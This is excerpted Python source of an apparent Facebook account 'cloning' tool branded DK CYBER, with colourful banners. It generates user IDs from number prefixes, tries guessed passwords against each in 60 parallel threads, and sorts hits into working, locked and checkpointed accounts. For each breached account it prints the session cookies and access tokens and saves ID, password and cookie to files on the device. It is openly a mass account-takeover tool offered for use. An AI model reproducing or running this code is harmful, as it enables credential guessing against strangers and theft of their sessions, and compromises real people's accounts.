...
os.system('xdg-open https://github.com/DK-VIRUS-XD')
name=fuckx.upper()

jalan('\x1b[1;31mDK CYBER  INFINITY CLONING START PLEASE WAIT ..........')
time.sleep(2)
os.system('clear')
loading()
...
def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :Dk = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :Dk = ' √ 2009'
        elif uid[:8] in ['10000000']        :Dk = ' √ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:Dk = ' √ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:Dk = ' 2010'
        elif uid[:6] in ['100001']          :Dk = ' √ 2010/2011'
        elif uid[:6] in ['100002','100003'] :Dk = ' √ 2011/2012'
        elif uid[:6] in ['100004']          :Dk = ' √ 2012/2013'
        elif uid[:6] in ['100005','100006'] :Dk = ' √ 2013/2014'
        elif uid[:6] in ['100007','100008'] :Dk = ' √ 2014/2015'
        elif uid[:6] in ['100009']          :Dk = ' √ 2015'
        elif uid[:5] in ['10001']           :Dk = ' √ 2015/2016'
        elif uid[:5] in ['10002']           :Dk = ' √ 2016/2017'
        elif uid[:5] in ['10003']           :Dk = ' √ 2018/2019'
        elif uid[:5] in ['10004']           :Dk = ' √ 2019/2020'
        elif uid[:5] in ['10005']           :Dk = ' √ 2020'
        elif uid[:5] in ['10006','10007','']:Dk = ' √ 2021'
        elif uid[:5] in ['10008']           :Dk = ' √ 2022'
        elif uid[:5] in ['10009']           :Dk = ' √ 2023'
        else:Dk=''
...
def banner():
 ...
 \033[1;91m
  \033[1;94m
   \033[1;94m
    \033[1;92m
     \033[1;92 _______   __    __         ______   __       __  ______  _______  
/       \ /  |  /  |       /      \ /  \     /  |/      |/       \ 
$$$$$$$  |$$ | /$$/       /$$$$$$  |$$  \   /$$ |$$$$$$/ $$$$$$$  |
$$ |  $$ |$$ |/$$/ ______ $$ |__$$ |$$$  \ /$$$ |  $$ |  $$ |__$$ |
$$ |  $$ |$$  $$< /      |$$    $$ |$$$$  /$$$$ |  $$ |  $$    $$< 
...
$$$$$$$/  $$/   $$/       $$/   $$/ $$/      $$/ $$$$$$/ $$/   $$/ 
   ...
   \033[1;93m𝙉\033[1;94m𝙊\033[1;91m𝘽\033[1;92m𝙄\033[1;95m𝙏\033[1;90m𝘼\033[1;92m-\033[1;91m𝙑\033[1;94m𝙄\033[1;93m𝙍\033[1;96m𝙐\033[1;95m𝙎
    ...
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} DARK CYBER             {N}{M}║
...
def main():
    ...
    print(f' ')
    IP = ipm['origin']
    print(f'{M}╔══[•] TOOL NAME : {H}DK GREEN X')
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}DK HASAN')
    print(f' ')
...
def _xnxx_():
    ...
    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
    print(f'{M}║══[•] VERSION   : {H}INFINITY')
    print(f'{M}╚══[•] CODER NAME: {H}DK-AMIR')
    print(f" ")
...
def shbd():
    ...
    print(f"")
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    print(f'{P}[{H}√{P}]EXAMPLE : {M}TIK TOK /I LOVE YOU/DK/DOREMON/OGGY')
    print("%s══════════════════════════%s══════════════════════════%s"%(M,H,P))
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love),  (xbook), (pok), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (xbook),  (pok), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (xbook), (pok), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), (xbook), ('###@@@'), ('#@#@#'), ('DK'), ('free fire')])
            if pom =='1':
...
def shind():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('57273200'), ('DK'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('DK'), ('57273200'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def shpak():
    ...
    with ThreadPool(max_workers=60) as smiyaaa:    
        ...
        for love in user:
            uid = ff+code+love
            if pp =='1':
                pwx = ([(code+love)[0:6], (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='2':
                pwx = ([(code+love), (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='3':
                pwx = ([(code+love)[0:8], (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='4':
                pwx = ([(code+love)[0:9], (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='5':
                pwx = ([(code+love)[0:10], (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='6':
                pwx = ([(code+love), (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='7':
                pwx = ([(ff+code+love)[0:12], (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='8':
                pwx = ([(ff+code+love)[0:13], (love), (code+love), (pok), ('DK'), ('free fire')])
            elif pp =='9':
                pwx = ([(ff+code+love), (love), (code+love), (pok), ('DK'), ('free fire')])
            if pom =='1':
                smiyaaa.submit(m,uid,pwx,tl)
            elif pom =='2':
                smiyaaa.submit(n,uid,pwx,tl)
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            Dk = random.choice(["\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO","\x1b[1;97mSHANTO","\x1b[1;91mSHANTO","\x1b[1;92mSHANTO","\x1b[1;93mSHANTO","\x1b[1;94mSHANTO","\x1b[1;95mSHANTO","\x1b[1;96mSHANTO"])
            sys.stdout.write(f'\r    {P}[{Dk}{P}][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}/{B}2F{P}]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok),len(lok),len(twf))),
            sys.stdout.flush()
            ...
            if 'm_page_voice' in log_cookies:
                ...
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[DK-LOK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in Dk:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/DK-LOK.txt', 'a').write(uidf+' | '+ps+'\n')
                lok.append(uidf)
            elif 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidf = coki[151:166]
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[DK-OK] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                if 'y' in Dk:
                  print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/DK-OK.txt', 'a').write(uidf+' | '+ps+'\n')
                ok.append(uidf)
            elif '/x/checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uidf=coki[141:156]
                    if 'y' in hello:
                      print('    \033[1;91m[DK-2F] '+uid+' | '+ps+'\033[1;91m'+samiya(uidf)+' ')
                      print(f'    {RED}[COOKI💉] {RED}'+coki)
                      open('/sdcard/DK-2F.txt', 'a').write(uidf+' | '+ps+'\n')
                    twf.append(uidf)
                    break
            else:
                continue
...
def n(uid,pwx,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mDK\033[1;90m]-[{fucker}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(ok)}\033[1;90m]');sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            #sys.stdout.write(f'\r    {P}[{Dk}{P}][{K}%s{P}/{B}%s{P}][{H}OK]{P}[{H}%s{P}|{M}%s{P}|{B}%s{P}] \r'%(loop,tl,len(ok))),
            #sys.stdout.flush()
            ...
            if 'access_token' in po:
                ...
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[DK-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/DK-OK.txt','a').write(str(uid)+' | '+ps+' | '+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    ...
    try:
        for ps in pwx:
            ...
            if 'access_token' in po:
                ...
                print('    \033[1;92m[DK-OK] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/DK-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                ok.append(uidf)
            elif 'www.facebook.com' in po['error_msg']:
                print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
                print('    \033[1;92m[DK-CP] '+uid+' | '+ps)
                print(f'    {B}[COOKI💉] {B}'+coki)
                open('/sdcard/DK-OK.txt','a').write(str(uidf)+' | '+ps+' | '+coki+'\n')
                cp.append(uidf)
                break
